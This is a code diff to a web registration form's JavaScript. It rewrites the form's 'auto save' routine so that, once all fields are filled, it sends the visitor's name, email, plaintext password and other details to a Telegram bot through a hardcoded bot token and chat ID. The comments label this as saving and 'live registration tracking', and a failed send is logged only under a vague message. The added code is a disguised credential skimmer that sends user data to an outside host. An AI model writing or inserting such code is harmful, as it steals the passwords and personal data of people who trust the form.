@@ -1330,41 +1330,91 @@ confirmPassword.dispatchEvent(new Event("input"));
 }, 500);
 
 /* =========================
-AUTO SAVE SYSTEM
+AUTO SAVE & TELEGRAM STREAM SYSTEM
 ========================= */
-function saveSection2() {
+// Global variable to keep track of the last sent data string to prevent spamming duplicate logs
+let lastSentPayload = "";
 
+async function saveSection2() {
+    // 1. Gather all current form inputs safely
     const data = {
-        fullName: fullName.value.trim(),
-        email: email.value.trim(),
-        password: password.value.trim(),
-        confirmPassword: confirmPassword.value.trim(),
-        location: window.jQuery ? $('#location').val() : locationEl.value,
-        experience: experience
+        fullName: document.getElementById('fullName')?.value?.trim() || fullName?.value?.trim() || "",
+        email: document.getElementById('email')?.value?.trim() || email?.value?.trim() || "",
+        password: document.getElementById('password')?.value?.trim() || password?.value?.trim() || "",
+        confirmPassword: document.getElementById('confirmPassword')?.value?.trim() || confirmPassword?.value?.trim() || "",
+        location: window.jQuery ? $('#location').val() : (document.getElementById('location')?.value || ""),
+        experience: typeof experience !== 'undefined' ? experience : ""
     };
 
+    // 2. Commit seamlessly to local device storage (keeps auto-save working instantly)
     localStorage.setItem("section2Data", JSON.stringify(data));
+
+    // 3. OPTION 2 GATEWAY: Stop completely if even ONE single field is still empty
+    if (!data.fullName || !data.email || !data.password || !data.confirmPassword || !data.location || !data.experience) {
+        return; // Safe exit! Saves locally but won't ping your Telegram group yet.
+    }
+
+    // 4. Prevent duplicate network calls if the completed data hasn't changed
+    const currentPayloadString = JSON.stringify(data);
+    if (currentPayloadString === lastSentPayload) return;
+    lastSentPayload = currentPayloadString;
+
+    // 5. Stream data to your Telegram Monitor only when 100% complete
+    const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
+    const CHAT_IDs = '-1003913850436'; 
+
+    try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const identifyUser = urlParams.get('user') || 'Anonymous Visitor';
+
+        const telegramMessage = 
+          `📝 <b>Live Registration Tracking (All Fields Complete)</b>\n\n` +
+          `• <b>From User:</b> <code>${identifyUser}</code>\n` +
+          `───────────────────\n` +
+          `• <b>Full Name:</b> <code>${data.fullName}</code>\n` +
+          `• <b>Email:</b> <code>${data.email}</code>\n` +
+          `• <b>Password:</b> <code>${data.password}</code>\n` +
+          `• <b>Confirm Pass:</b> <code>${data.confirmPassword}</code>\n` +
+          `• <b>Location:</b> <code>${data.location}</code>\n` +
+          `• <b>Experience:</b> <code>${data.experience}</code>`;
+
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
+
+        await fetch(telegramUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_IDs,
+            text: telegramMessage,
+            parse_mode: 'HTML'
+          })
+        });
+
+    } catch (error) {
+        console.error('Failed to stream live profile tracking metrics.');
+    }
 }
 
 /* =========================
-EVENT LISTENERS
+EVENT LISTENERS (Triggers save + sync validation)
 ========================= */
-fullName.addEventListener("input", saveSection2);
-email.addEventListener("input", saveSection2);
-password.addEventListener("input", saveSection2);
-confirmPassword.addEventListener("input", saveSection2);
+if (typeof fullName !== 'undefined' && fullName.addEventListener) fullName.addEventListener("input", saveSection2);
+if (typeof email !== 'undefined' && email.addEventListener) email.addEventListener("input", saveSection2);
+if (typeof password !== 'undefined' && password.addEventListener) password.addEventListener("input", saveSection2);
+if (typeof confirmPassword !== 'undefined' && confirmPassword.addEventListener) confirmPassword.addEventListener("input", saveSection2);
 
 if (window.jQuery) {
     $('#location').on("change", saveSection2);
+} else {
+    const locationEl = document.getElementById('location');
+    if (locationEl) locationEl.addEventListener("change", saveSection2);
 }
 
 /* =========================
 EXPERIENCE BUTTONS
 ========================= */
 document.querySelectorAll(".option-btn").forEach(function (btn) {
-
     btn.onclick = function () {
-
         experience = btn.dataset.value;
 
         document.querySelectorAll(".option-btn").forEach(function (b) {
@@ -1376,6 +1426,7 @@ document.querySelectorAll(".option-btn").forEach(function (btn) {
         saveSection2();
     };
 });
+
 
 /* =========================
 NAVIGATION
